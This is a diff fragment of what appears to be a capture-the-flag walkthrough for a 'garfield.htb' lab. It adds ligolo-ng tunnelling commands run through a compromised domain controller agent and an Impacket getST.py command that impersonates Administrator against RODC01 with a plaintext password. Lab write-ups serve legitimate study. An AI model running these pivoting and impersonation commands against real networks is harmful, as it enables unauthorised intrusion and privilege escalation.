@@ -436,8 +436,16 @@ INFO[0069] Interface created!
 [Agent : GARFIELD\l.wilson_adm@DC01] » route_add --name ligolo --route 192.168.100.0/24
 INFO[0106] Route created.        
 
-
+[Agent : GARFIELD\l.wilson_adm@DC01] » start 
+INFO[0301] Starting tunnel to GARFIELD\l.wilson_adm@DC01 (00155d0bdd00) 
+[Agent : GARFIELD\l.wilson_adm@DC01] » 
 ```
+
+Ill then select the new session, add the new interface and add the routing info and start the tunnel
+
+![](Pasted%20image%2020261109203640.png)
+
+I can now ping the device
 
 ```python
 ❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "$DC_IP" 'garfield.htb/l.wilson_adm:Password123!'
